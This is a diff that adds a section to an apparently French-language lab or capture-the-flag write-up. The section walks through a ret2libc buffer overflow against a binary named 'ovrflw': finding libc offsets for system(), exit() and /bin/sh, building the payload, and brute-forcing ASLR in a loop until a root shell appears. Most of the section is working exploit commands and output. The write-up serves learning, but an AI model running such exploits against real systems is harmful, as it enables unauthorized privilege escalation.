@@ -275,5 +275,92 @@ Comme nous pouvons le voir, le programme nous retourne l'adresse `0x61413761`, n
     
 Donc, si nous dépassons les 22 caractères, nous écraserons le registre `EIP` (EIP est un registre qui pointe vers la prochaine instruction, donc après les 22 caractères nous metterons l'adresse de `system()` pour qu'il pointe `system()`).
 
-## Adresse de system
+## Adresse de system(), exit(), et /bin/sh
 
+    www-data@checkpoint04:/$ readelf -s /lib32/libc.so.6|grep -e " system@" -e " exit@"
+       147: 00030060    33 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+      1510: 0003ce10    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+
+    www-data@checkpoint04:/$ strings -a -t x /lib32/libc.so.6 |grep /bin/
+     17b88f /bin/sh
+     17d27a /bin/csh
+
+- L'adresse de `exit()` correspond à 00030060 soit `0x30060`.
+- L'adresse de `system()` correspond à 0003ce10 soit `0x3ce10`.
+- L'adresse de `/bin/sh` correspond à 17b88f soit `0x17b88f`.
+
+Nous pouvons voir les adresses comportent des `null-bytes` ce qui correspond à `00` ce qui est un gros problème pour l'exploitation, pour cela nous devons récupérer l'adresse de la `libc` avec la commande `ldd` et les additionées.
+
+    www-data@checkpoint04:/$ ldd /usr/bin/ovrflw 
+            linux-gate.so.1 (0xf7f22000)
+            libc.so.6 => /lib32/libc.so.6 (0xf7d38000)
+            /lib/ld-linux.so.2 (0xf7f23000)
+            
+Donc nous devons additioner l'adresse de la libc avec `0xf7d38000` avec les autres adresses `system()`, `exit()` et `/bin/sh`. Donc, lançons Python :
+
+    www-data@checkpoint04:/$ python
+    Python 2.7.17 (default, Sep 30 2020, 13:38:04) 
+    [GCC 7.5.0] on linux2
+    Type "help", "copyright", "credits" or "license" for more information.
+    >>> hex(0xf7d38000 + 0x30060)  # exit
+    '0xf7d68060'
+    >>> hex(0xf7d38000 + 0x3ce10)  # system
+    0xf7d74e10
+    >>> hex(0xf7d38000 + 0x17b88f) # /bin/sh
+    0xf7eb388f
+
+Donc, nous commençerons par mettre la taille du `buffer` :
+
+    www-data@checkpoint04# /usr/bin/ovrflw $(python -c 'print "A"*22')
+
+Ensuite, nous mettrons l'adresse de système :
+
+    www-data@checkpoint04# /usr/bin/ovrflw $(python -c 'print "A"*22 + "\x10\x4e\xd7\xf7"')
+    
+Juste après la fonction `system()`, nous mettrons l'adresse de retour donc l'adresse `exit()` :
+
+    www-data@checkpoint04# /usr/bin/ovrflw $(python -c 'print "A"*22 + "\x10\x4e\xd7\xf7" + "\x60\x80\xd6\xf7"')
+    
+Et enfin, l'adresse de `/bin/sh` :
+
+    www-data@checkpoint04# /usr/bin/ovrflw $(python -c 'print "A"*22 + "\x10\x4e\xd7\xf7" + "\x60\x80\xd6\xf7" + "\x8f\x38\xeb\xf7"')
+    
+Donc, comme nous l'avons vu, l'`ASLR` est activé donc les adresses sont randomisées, donc nous savons que le programme `ovrflw` est un programme 32-bit et que les adresses 32-bit sont limtiés à 512 solutions, nous avons juste à faire une boucle infinie et nous tomberons sur la bonne adresse.
+
+    www-data@checkpoint04# while true; do /usr/bin/ovrflw $(python -c 'print "A"*22 + "\x10\x4e\xd7\xf7" + "\x60\x80\xd6\xf7" + "\x8f\x38\xeb\xf7"'); done
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Illegal instruction
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Illegal instruction
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Illegal instruction
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    Segmentation fault
+    Your name : AAAAAAAAAAAAAAAAAAAAAAN`8
+    # id
+    uid=0(root) gid=33(www-data) groups=33(www-data)
+  
